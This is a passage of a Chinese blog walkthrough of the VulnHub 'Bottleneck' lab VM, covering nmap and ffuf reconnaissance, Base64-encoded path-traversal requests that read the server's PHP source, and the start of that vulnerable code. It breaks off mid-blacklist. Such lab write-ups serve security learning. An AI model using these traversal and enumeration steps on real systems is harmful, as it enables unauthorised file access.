@@ -1,0 +1,782 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="大一第一次被布置打这个靶场的时候，难度并不适合当时的我，现在来看我还是差点"><title>Bottleneck 1 Vulunhub靶场复现-重走来时路6</title><link rel=canonical href=https://ke1thli.github.io/p/bottleneck-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="Bottleneck 1 Vulunhub靶场复现-重走来时路6"><meta property='og:description' content="大一第一次被布置打这个靶场的时候，难度并不适合当时的我，现在来看我还是差点"><meta property='og:url' content='https://ke1thli.github.io/p/bottleneck-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-08-11T00:00:00+00:00'><meta property='article:modified_time' content='2026-08-11T00:00:00+00:00'><meta name=twitter:title content="Bottleneck 1 Vulunhub靶场复现-重走来时路6"><meta name=twitter:description content="大一第一次被布置打这个靶场的时候，难度并不适合当时的我，现在来看我还是差点"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a><ol><li><a href=#靶场搭建>靶场搭建</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a><ol><li><a href=#结果分析>结果分析</a></li></ol></li><li><a href=#目录扫描>目录扫描</a></li><li><a href=#web-信息收集>Web 信息收集</a></li></ol></li><li><a href=#image_galleryphp>image_gallery.php</a><ol><li><a href=#分析-f-参数>分析 f 参数</a></li><li><a href=#抓包分析参数>抓包分析参数</a></li><li><a href=#获取-image_gallery_loadphp-源码>获取 image_gallery_load.php 源码</a></li></ol></li><li><a href=#漏洞代码分析>漏洞代码分析</a><ol><li><a href=#1-f-会经过-base64-解码>1. f 会经过 Base64 解码</a></li><li><a href=#2-t-必须是新鲜的时间戳>2. t 必须是新鲜的时间戳</a></li><li><a href=#3-当前工作目录被切换到-img>3. 当前工作目录被切换到 img</a></li></ol></li><li><a href=#验证任意文件读取>验证任意文件读取</a><ol><li><a href=#测试路径规范化>测试路径规范化</a></li><li><a href=#尝试读取-etcpasswd>尝试读取 /etc/passwd</a></li></ol></li><li><a href=#测试-php-stream-wrapper>测试 PHP Stream Wrapper</a><ol><li><ol><li><a href=#分析黑名单触发后的-ids-逻辑>分析黑名单触发后的 IDS 逻辑</a></li></ol></li><li><a href=#读取-ids-的执行结果>读取 IDS 的执行结果</a></li><li><a href=#分析-ids-脚本行为>分析 IDS 脚本行为</a></li><li><a href=#尝试-python-注入>尝试 Python 注入</a></li><li><a href=#建立反弹-shell>建立反弹 Shell</a></li><li><a href=#升级-shell>升级 Shell</a></li></ol></li><li><a href=#权限提升>权限提升</a></li><li><a href=#获取第一个-flag>获取第一个 Flag</a><ol><li><a href=#分析-clear_logs>分析 clear_logs</a></li><li><a href=#利用可控软链接进行提权>利用可控软链接进行提权</a></li><li><a href=#获取-user-flag>获取 User Flag</a></li></ol></li><li><a href=#权限提升至-root>权限提升至 root</a><ol><li><a href=#分析-testlib>分析 testlib</a></li><li><a href=#分析程序逻辑>分析程序逻辑</a></li></ol></li><li><a href=#编写恶意共享库>编写恶意共享库</a></li><li><a href=#将共享库上传到靶机>将共享库上传到靶机</a></li><li><a href=#利用-suid-程序加载恶意共享库>利用 SUID 程序加载恶意共享库</a></li><li><a href=#获取-root-flag>获取 Root Flag</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/bottleneck-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/>Bottleneck 1 Vulunhub靶场复现-重走来时路6</a></h2><h3 class=article-subtitle>大一第一次被布置打这个靶场的时候，难度并不适合当时的我，现在来看我还是差点</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-11T00:00:00Z>Tuesday, August 11, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a><ol><li><a href=#靶场搭建>靶场搭建</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a><ol><li><a href=#结果分析>结果分析</a></li></ol></li><li><a href=#目录扫描>目录扫描</a></li><li><a href=#web-信息收集>Web 信息收集</a></li></ol></li><li><a href=#image_galleryphp>image_gallery.php</a><ol><li><a href=#分析-f-参数>分析 f 参数</a></li><li><a href=#抓包分析参数>抓包分析参数</a></li><li><a href=#获取-image_gallery_loadphp-源码>获取 image_gallery_load.php 源码</a></li></ol></li><li><a href=#漏洞代码分析>漏洞代码分析</a><ol><li><a href=#1-f-会经过-base64-解码>1. f 会经过 Base64 解码</a></li><li><a href=#2-t-必须是新鲜的时间戳>2. t 必须是新鲜的时间戳</a></li><li><a href=#3-当前工作目录被切换到-img>3. 当前工作目录被切换到 img</a></li></ol></li><li><a href=#验证任意文件读取>验证任意文件读取</a><ol><li><a href=#测试路径规范化>测试路径规范化</a></li><li><a href=#尝试读取-etcpasswd>尝试读取 /etc/passwd</a></li></ol></li><li><a href=#测试-php-stream-wrapper>测试 PHP Stream Wrapper</a><ol><li><ol><li><a href=#分析黑名单触发后的-ids-逻辑>分析黑名单触发后的 IDS 逻辑</a></li></ol></li><li><a href=#读取-ids-的执行结果>读取 IDS 的执行结果</a></li><li><a href=#分析-ids-脚本行为>分析 IDS 脚本行为</a></li><li><a href=#尝试-python-注入>尝试 Python 注入</a></li><li><a href=#建立反弹-shell>建立反弹 Shell</a></li><li><a href=#升级-shell>升级 Shell</a></li></ol></li><li><a href=#权限提升>权限提升</a></li><li><a href=#获取第一个-flag>获取第一个 Flag</a><ol><li><a href=#分析-clear_logs>分析 clear_logs</a></li><li><a href=#利用可控软链接进行提权>利用可控软链接进行提权</a></li><li><a href=#获取-user-flag>获取 User Flag</a></li></ol></li><li><a href=#权限提升至-root>权限提升至 root</a><ol><li><a href=#分析-testlib>分析 testlib</a></li><li><a href=#分析程序逻辑>分析程序逻辑</a></li></ol></li><li><a href=#编写恶意共享库>编写恶意共享库</a></li><li><a href=#将共享库上传到靶机>将共享库上传到靶机</a></li><li><a href=#利用-suid-程序加载恶意共享库>利用 SUID 程序加载恶意共享库</a></li><li><a href=#获取-root-flag>获取 Root Flag</a></li></ol></nav></details></aside><section class=article-content><h1 id=bottleneck-vulnhub-靶场复现>Bottleneck VulnHub 靶场复现</h1><h2 id=靶场介绍与搭建>靶场介绍与搭建</h2><p>下载地址：</p><p><a class=link href=https://download.vulnhub.com/bottleneck/Bottleneck.ova target=_blank rel=noopener>https://download.vulnhub.com/bottleneck/Bottleneck.ova</a></p><p>Bottleneck 是一台中等难度的 Boot2Root 靶机，靶场有两个 Flag。</p><p>Bottleneck is an intermediate boot2root machine.
+After some cyber attacks the admin hardened the system, show him that it&rsquo;s not so secure.</p><p>作者：</p><p>@bytevsbyt3</p><h3 id=靶场搭建>靶场搭建</h3><p>该靶场默认使用桥接模式，使用 VMware 导入 OVA 后可能无法正常获取靶机 IP。</p><p>最终采用 VirtualBox Host-Only 的方式搭建：</p><ol><li><p>Bottleneck 使用 VirtualBox 启动。</p></li><li><p>网络设置为 <code>Host-Only Adapter</code>。</p></li><li><p>Kali 使用 VMware 启动，并连接 VirtualBox 的 Host-Only 网卡。</p></li><li><p>靶机启动后可以看到：</p></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Ubuntu 19.04 bottleneck tty1
+</span></span><span class=line><span class=cl>enp0s3:192.168.56.4
+</span></span><span class=line><span class=cl>bottleneck login:-
+</span></span></code></pre></td></tr></table></div></div><p>Kali 获取到的 Host-Only 地址为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>192.168.56.128
+</span></span></code></pre></td></tr></table></div></div><p>因此后续攻击机和靶机位于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Kali       192.168.56.128
+</span></span><span class=line><span class=cl>Bottleneck 192.168.56.4
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><p>首先扫描整个 <code>192.168.56.0/24</code> 网段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sn 192.168.56.0/24
+</span></span></code></pre></td></tr></table></div></div><p>发现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>192.168.56.2
+</span></span><span class=line><span class=cl>192.168.56.4
+</span></span><span class=line><span class=cl>192.168.56.5
+</span></span><span class=line><span class=cl>192.168.56.128
+</span></span></code></pre></td></tr></table></div></div><p>其中 <code>192.168.56.128</code> 是 Kali 自己的地址。</p><p>由于 <code>.4</code> 和 <code>.5</code> 都可能是靶机，因此继续进行端口扫描。</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap --min-rate <span class=m>1000</span> -p- 192.168.56.4
+</span></span></code></pre></td></tr></table></div></div><p>结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span></code></pre></td></tr></table></div></div><p>因此可以确认：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>192.168.56.4
+</span></span></code></pre></td></tr></table></div></div><p>就是 Bottleneck 靶机。</p><p>继续进行详细探测：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -p22,80 -A 192.168.56.4
+</span></span></code></pre></td></tr></table></div></div><p>主要结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10
+</span></span><span class=line><span class=cl>80/tcp open  http    nginx
+</span></span><span class=line><span class=cl>|_http-title: BOTTLENECK
+</span></span></code></pre></td></tr></table></div></div><h4 id=结果分析>结果分析</h4><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>信息</th><th>分析</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 7.9p1</td><td>后续拿到凭据后作为登录入口</td></tr><tr><td>80</td><td>HTTP</td><td>nginx</td><td>当前最主要的攻击面</td></tr></tbody></table></div><hr><h3 id=目录扫描>目录扫描</h3><p>使用 ffuf 对 Web 目录进行枚举：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -w /usr/share/wordlists/dirb/big.txt <span class=se>\ </span>-u http://192.168.56.4/FUZZ <span class=se>\ </span>-e .php
+</span></span></code></pre></td></tr></table></div></div><p>发现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>css                     [Status: 301]
+</span></span><span class=line><span class=cl>image_gallery.php       [Status: 200]
+</span></span><span class=line><span class=cl>img                     [Status: 301]
+</span></span><span class=line><span class=cl>index.php               [Status: 200]
+</span></span><span class=line><span class=cl>js                      [Status: 301]
+</span></span><span class=line><span class=cl>vendor                  [Status: 301]
+</span></span></code></pre></td></tr></table></div></div><p>其中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>image_gallery.php
+</span></span></code></pre></td></tr></table></div></div><p>比较值得关注。</p><hr><h3 id=web-信息收集>Web 信息收集</h3><p>访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://192.168.56.4/
+</span></span></code></pre></td></tr></table></div></div><p>主页没有明显的登录入口或者其他直接利用点。</p><p>页面源码中存在一段注释：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- shit, seriously matrix 4 is real? I&#39;m scared.. --&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>暂时没有明显利用价值。</p><p>因此继续查看 <code>image_gallery.php</code>。</p><hr><h2 id=image_galleryphp>image_gallery.php</h2><p>访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://192.168.56.4/image_gallery.php
+</span></span></code></pre></td></tr></table></div></div><p>查看页面源代码，发现了一个特殊请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>image_gallery.php?t=1786267450&amp;f=Ym90dGxlbmVja19kb250YmUucG5n
+</span></span></code></pre></td></tr></table></div></div><p>其中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>t = 1786267450
+</span></span><span class=line><span class=cl>f = Ym90dGxlbmVja19kb250YmUucG5n
+</span></span></code></pre></td></tr></table></div></div><h3 id=分析-f-参数>分析 f 参数</h3><p><code>f</code> 很明显是 Base64 编码。</p><p>可以直接使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;Ym90dGxlbmVja19kb250YmUucG5n&#39;</span> <span class=p>|</span> base64 -d
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>bottleneck_dontbe.png
+</span></span></code></pre></td></tr></table></div></div><p>说明 <code>f</code> 很可能用于传递图片文件名。</p><hr><h3 id=抓包分析参数>抓包分析参数</h3><p>进一步分析：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>image_gallery.php?t=1786267450&amp;f=Ym90dGxlbmVja19kb250YmUucG5n
+</span></span></code></pre></td></tr></table></div></div><p>可以推测：</p><ul><li><p><code>t</code> 是时间戳；</p></li><li><p><code>f</code> 是经过 Base64 编码的文件路径。</p></li></ul><p>查看 <code>image_gallery.php</code> 源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$tstamp</span> <span class=o>=</span> <span class=nx>time</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=k>include_once</span> <span class=s1>&#39;image_gallery_load.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以发现真正处理 <code>t</code> 和 <code>f</code> 的代码位于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>image_gallery_load.php
+</span></span></code></pre></td></tr></table></div></div><hr><h3 id=获取-image_gallery_loadphp-源码>获取 image_gallery_load.php 源码</h3><p>通过前面发现的文件读取漏洞，可以尝试读取：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../image_gallery_load.php
+</span></span></code></pre></td></tr></table></div></div><p>使用自己的 Python3 脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;../image_gallery_load.php&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>或者直接构造 Base64：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s1>&#39;../image_gallery_load.php&#39;</span> <span class=p>|</span> base64
+</span></span></code></pre></td></tr></table></div></div><p>得到对应的 <code>f</code> 参数后访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://192.168.56.4/image_gallery.php?t=&lt;当前时间戳&gt;&amp;f=&lt;Base64&gt;
+</span></span></code></pre></td></tr></table></div></div><p>最终获取到核心代码。</p><hr><h2 id=漏洞代码分析>漏洞代码分析</h2><p>核心代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$imagefile</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$timestamp</span> <span class=o>=</span> <span class=nx>time</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$blacklist</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/etc&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/opt&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/var&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/proc&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/dev&#39;</span><span class=p>,</span>
